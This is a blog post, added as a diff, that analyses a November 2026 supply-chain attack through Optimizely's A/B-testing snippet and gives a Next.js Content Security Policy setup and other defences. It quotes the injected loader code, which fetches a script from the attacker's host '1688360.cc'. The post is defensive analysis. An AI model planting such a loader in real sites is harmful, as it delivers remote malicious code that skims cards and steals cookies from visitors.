@@ -1,0 +1,222 @@
+---
+title: 'The Optimizely Hack: How a Trusted Script Hit 178 Sites, and How to Protect Yours'
+summary: >-
+  A trusted A/B-testing script swapped crypto addresses and skimmed cards on 178 major sites. What happened, why most CSPs didn't stop it, and a Next.js setup that would have.
+publishedAt: 2026-11-28
+draft: false
+tags:
+  - Security
+  - Next.js
+  - Web
+  - JavaScript
+cover: /blog/optimizely-supply-chain-attack-third-party-scripts/cover.jpg
+---
+On November 16, visitors to Zoom, the BBC, CNN, GitLab, IKEA, HSBC, Ledger and more than 170 other organizations' websites ran malicious JavaScript. None of those companies' own servers was breached. The code came from a script every one of them had chosen to load: their **Optimizely** A/B-testing snippet, served from Optimizely's own CDN with Optimizely's own certificate.
+
+If your site loads analytics, chat widgets, tag managers or experiment tools, this attack is about you too. Here's what happened, why most sites' defenses didn't stop it, and a concrete setup for Next.js that would have limited the damage.
+
+The facts below come from [Report URI's analysis](https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/), which found and documented the attack the same day, and from [Optimizely's incident updates](https://stspg.io/ljdfwlhkws0w).
+
+![How the attack worked: the attacker wrote a loader into customer projects' custom JavaScript, the trusted CDN served the snippet to visitors, and the payload swapped crypto addresses, skimmed cards and stole cookies. A host allowlist trusted the CDN; a tight script-src blocked the payload host; connect-src blocked data theft but not in-page address swapping](/blog/optimizely-supply-chain-attack-third-party-scripts/attack-flow.jpg)
+
+## What happened
+
+Optimizely Web works by having each customer load a JavaScript snippet from Optimizely's CDN. The snippet includes an optional field called **Project JavaScript**: custom code the customer writes in the Optimizely dashboard, which runs on every page.
+
+According to Optimizely, an unauthorized party **exploited a flaw in the Web Experimentation account signup flow**, used it to impersonate users on targeted customer accounts, and inserted malicious JavaScript into those customers' projects. Optimizely says it closed the vulnerability within three hours of detecting it, that it was not a credentials breach, and that fewer than 5% of its customers were affected.
+
+The injected code was tiny. Here's what Report URI found added to one snippet (formatted for reading):
+
+```js
+(function () {
+  try {
+    var s = document.createElement("script");
+    s.src = "https://1688360.cc/track.js";
+    s.async = true;
+    (document.head || document.documentElement).appendChild(s);
+  } catch (e) {}
+})();
+```
+
+The rest of each snippet was untouched, so experiments kept running and nothing looked broken. Report URI checked 1,611 Optimizely snippets and found the loader in **188 snippets belonging to 178 organizations**. Some versions hid the URL in base64, and one carried a full inline copy of the payload that ran through `eval` if the payload host was blocked.
+
+## What the payload did
+
+The loaded script, `track.js`, was rebuilt 26 times during the day. By the end it did four things at once:
+
+1. **Swapped crypto wallet addresses** for the attacker's, in page text, form fields, links, the clipboard, and outgoing requests. It validated checksums, so it only replaced real addresses.
+2. **Skimmed payment cards** typed into a site's own form fields. Cards entered inside hosted payment iframes (Stripe, Adyen and similar) were out of its reach.
+3. **Stole cookies and screenshots**: any cookie not marked `HttpOnly`, plus a rendered screenshot of the page.
+4. **Delivered iOS exploit kits** to iPhones and iPads on older iOS versions.
+
+Report URI traced about **$7,000 in crypto** to the attacker's wallets on the first day. It can't see how many cards or cookies were stolen. Most infected snippets were cleaned within about 17 hours of the first injection.
+
+## Why most defenses didn't stop it
+
+### Trusting a domain isn't trusting the code
+
+Most security reviews of third-party scripts ask "is this vendor trustworthy?" and then allow the vendor's domain. That's exactly what this attack went around. The file came from `cdn.optimizely.com`, the domain every affected site had approved. Report URI is explicit that Optimizely's CDN served exactly what it was given; this wasn't a CDN compromise.
+
+**Subresource Integrity (SRI)**, which pins a script to a hash, doesn't help either: an experimentation snippet changes every time someone edits an experiment, so sites can't pin it.
+
+### What CSP actually did
+
+Report URI crawled 256 affected organizations' sites and checked their Content Security Policy against what the payload needed:
+
+| Result | Sites |
+| --- | --- |
+| No CSP at all | 68 |
+| CSP allowed the payload and the data theft | 50 |
+| Payload ran, but `connect-src` blocked the data theft | 17 |
+| CSP blocked the payload | 24 (15%) |
+
+The 24 sites that were protected had one thing in common: a **restrictive `script-src`** that listed only the hosts they needed, so a script from `1688360.cc` simply couldn't load. Two common settings let it straight through:
+
+- **`'strict-dynamic'`**, which tells the browser that any script loaded by a trusted script is trusted too. The trusted Optimizely snippet inserted the payload, so the payload inherited its trust.
+- **`'unsafe-eval'`**, which ran the inline fallback copy even on sites that blocked the payload host.
+
+And one limitation matters: **`connect-src` stopped data theft but not address swapping.** Swapping an address happens entirely inside the page; no network request is needed, so no network rule can block it.
+
+## How to protect your site
+
+You can't make a third-party script safe. You can limit what it can do, keep it away from sensitive pages, and find out fast when it changes.
+
+### 1. Load fewer third-party scripts
+
+Every script you add can run any code with full access to your page. For each one, ask whether you still need it, and whether it needs to be on every page. The scripts you remove are the only ones you never have to worry about.
+
+### 2. Keep checkout and account pages clean
+
+Your most sensitive pages should load as little third-party code as possible: no A/B testing, no tag managers, no chat widgets. Use your payment provider's **hosted fields or iframes** for card entry. In this attack, cards typed into a site's own form fields were skimmed; cards entered in Stripe's or Adyen's iframes were not.
+
+### 3. Write a CSP that lists hosts, per route
+
+Here's a Next.js 16 `proxy.ts` that builds the policy per request, with a separate, tighter list for checkout:
+
+```ts
+// proxy.ts
+import { NextResponse, type NextRequest } from "next/server";
+
+type Sources = { script: string[]; connect: string[]; frame: string[] };
+
+// Every third-party host is listed on purpose, per route. No wildcards, no 'unsafe-eval' in production.
+const DEFAULT_SOURCES: Sources = {
+  script: ["https://plausible.io"],
+  connect: ["https://plausible.io"],
+  frame: [],
+};
+
+// Checkout only loads the payment provider (Stripe.js), nothing else.
+const CHECKOUT_SOURCES: Sources = {
+  script: ["https://js.stripe.com", "https://*.js.stripe.com"],
+  connect: ["https://api.stripe.com"],
+  frame: ["https://js.stripe.com", "https://*.js.stripe.com", "https://hooks.stripe.com"],
+};
+
+export function proxy(request: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const isDev = process.env.NODE_ENV === "development";
+  const isCheckout = request.nextUrl.pathname.startsWith("/checkout");
+  const sources = isCheckout ? CHECKOUT_SOURCES : DEFAULT_SOURCES;
+
+  const policy = [
+    `default-src 'self'`,
+    // No 'strict-dynamic': scripts that an allowed script injects must also be on this list.
+    `script-src 'self' 'nonce-${nonce}' ${sources.script.join(" ")}${isDev ? " 'unsafe-eval'" : ""}`,
+    `connect-src 'self' ${sources.connect.join(" ")}`,
+    `frame-src ${sources.frame.length ? sources.frame.join(" ") : "'none'"}`,
+    `style-src 'self' 'unsafe-inline'`,
+    `img-src 'self' blob: data:`,
+    `font-src 'self'`,
+    `object-src 'none'`,
+    `base-uri 'self'`,
+    `form-action 'self'`,
+    `frame-ancestors 'none'`,
+    `report-uri /api/csp-report`,
+  ].join("; ");
+
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", policy);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  // Start with Content-Security-Policy-Report-Only, watch the reports, then switch to enforcing.
+  response.headers.set("Content-Security-Policy-Report-Only", policy);
+  return response;
+}
+
+export const config = {
+  matcher: [
+    {
+      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
+      missing: [
+        { type: "header", key: "next-router-prefetch" },
+        { type: "header", key: "purpose", value: "prefetch" },
+      ],
+    },
+  ],
+};
+```
+
+I tested this proxy in a Next.js 16.2.9 production build with the policy enforced: pages hydrate normally without `'strict-dynamic'`, and on `/checkout` a script from a host that isn't on the list is blocked by the browser.
+
+How this maps to the attack:
+
+- **No `'strict-dynamic'`.** The [Next.js CSP guide](https://nextjs.org/docs/app/guides/content-security-policy)'s example uses `'strict-dynamic'`, which is a strong defense against XSS in *your own* code. But it passes trust on to anything a trusted script loads, which is exactly how the Optimizely payload got through. If you load third-party scripts that load other scripts, listing hosts explicitly is the safer choice. With `'strict-dynamic'` present, browsers ignore host lists in `script-src` anyway.
+- **No `'unsafe-eval'` in production.** Next.js needs it only in development; neither React nor Next.js uses `eval` in production by default.
+- **A tight `connect-src`.** Even if a script runs, it can only send data to hosts you listed.
+- **Next.js adds the nonce for you.** Next.js reads the nonce from the request's CSP header and attaches it to its own scripts. Nonces require **dynamic rendering**, though: statically generated pages are built before any request exists. For static pages, use a host-list policy without nonces, or hashes.
+
+One trade-off: a site-wide `script-src` without `'strict-dynamic'` means every host a vendor's script loads from must be on your list. That's more work, and some tools load code from many hosts. Treat that as useful information: if you can't list everything a script loads, you don't really know what it does.
+
+### 4. Roll out in report-only mode, and keep the reports
+
+Start with `Content-Security-Policy-Report-Only`. The browser reports violations without blocking anything, so you find the hosts you forgot before you break the site. Add a small endpoint to receive the reports:
+
+```ts
+// app/api/csp-report/route.ts
+export async function POST(request: Request) {
+  const body = await request.text();
+  // Send these to your logging or monitoring tool. A new blocked host is worth an alert.
+  console.warn("CSP violation", body.slice(0, 2000));
+  return new Response(null, { status: 204 });
+}
+```
+
+Once the reports are quiet, switch the response header to `Content-Security-Policy` and keep reporting on. In production, a report for an unfamiliar host is exactly the early warning this attack would have triggered.
+
+### 5. Mark session cookies HttpOnly
+
+The payload stole every cookie that JavaScript could read. Cookies marked `HttpOnly` aren't visible to `document.cookie`, so session tokens should always have it (along with `Secure` and a suitable `SameSite`).
+
+### 6. Treat vendor dashboards like production access
+
+Anything that can change the JavaScript on your site is effectively production access: experiment tools, tag managers, CMS script fields. Review who has write access, remove people who don't need it, require strong authentication, and check the audit log after incidents like this one.
+
+## If you use Optimizely Web
+
+Report URI's recommendations for affected customers: check every project's Project JavaScript and every experiment's custom code for `1688360.cc`, `atob(` or anything you didn't write; review users, API tokens and integrations with write access, and rotate credentials; treat card data entered in your own forms on November 16, and secrets in non-`HttpOnly` cookies, as potentially exposed. Optimizely says it has contacted every Web Experimentation customer directly about whether they were affected.
+
+If you visited an affected site that day: update your iPhone or iPad, check any crypto transfer you made (verify the destination address on your wallet's own screen, not on a web page), and watch your card statements.
+
+## The lesson
+
+Every script you load runs with the same power as your own code. The Optimizely attack didn't need a vulnerability in any victim's code; it needed one trusted vendor to serve something new for a few hours. The defenses that worked weren't exotic: fewer scripts, clean sensitive pages, a CSP that lists hosts instead of trusting chains, and monitoring that notices change.
+
+## FAQ
+
+### What was the Optimizely supply-chain attack?
+
+On November 16, 2026, an attacker exploited a flaw in Optimizely Web Experimentation's signup flow and inserted malicious JavaScript into customer projects. Visitors to 178 organizations' sites, including Zoom, the BBC and CNN, received code that swapped crypto addresses, skimmed cards, stole cookies and targeted iPhones.
+
+### Would a Content Security Policy have stopped it?
+
+Partly. Report URI found that only 24 of 256 affected sites' CSPs blocked the payload; those had a restrictive `script-src` without `'strict-dynamic'` or `'unsafe-eval'`. A tight `connect-src` stopped data theft but not in-page address swapping.
+
+### Why didn't Subresource Integrity help?
+
+SRI pins a script to a fixed hash, but experimentation snippets change whenever an experiment changes, so sites can't use SRI on them.
+
+### How do I protect my site from third-party script attacks?
+
+Load fewer third-party scripts, keep them off checkout and account pages, use hosted payment fields, write a host-list CSP with a tight `connect-src`, monitor CSP reports, mark session cookies `HttpOnly`, and limit who can edit scripts in vendor dashboards.
